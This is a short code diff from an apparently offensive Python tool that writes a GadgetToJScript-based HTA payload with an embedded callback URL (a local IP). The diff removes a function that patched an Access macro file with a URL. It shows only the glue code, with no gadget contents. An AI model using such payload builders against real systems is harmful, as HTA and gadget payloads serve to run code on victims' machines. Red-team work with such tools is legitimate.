@@ -47,26 +47,13 @@ def decode_and_replace_gadget(gadget_template_location, url, output_file, compil
 		content=content.replace("REPLACEMODIFIEDGADGETHERE", encodedOutput.decode("utf-8"))
 
 		#Open the output file and write content to it
+		print("Writing HTA using GadgetToJScript to: ", output_file)
 		outfile=open(output_file, "w")
 		outfile.write(content)
 		outfile.close()
 
 	else:
 		print("Failed to generate Access Macro.")
-
-def open_and_write_gadget(access_file_location, url, output_file):
-	paddedUrl = pad_replacement(url)
-	if paddedUrl:
-		f=open(access_file_location, "rb")
-		s=f.read()
-		f.close()
-		s=s.replace(replaceString, bytes(paddedUrl, encoding='utf8'))
-		print("Writing Access Macro (accdb) to file: ", output_file)
-		new=open(output_file, "wb")
-		new.write(s)
-		new.close()
-	else:
-		print("Failed to generate Access Macro.")
-
+		
 if __name__ == "__main__":
 	decode_and_replace_gadget("./gadget-jscript-template.hta","http://192.168.1.101:80","./test-gadget-out.hta","./decoded-gadget.exe")
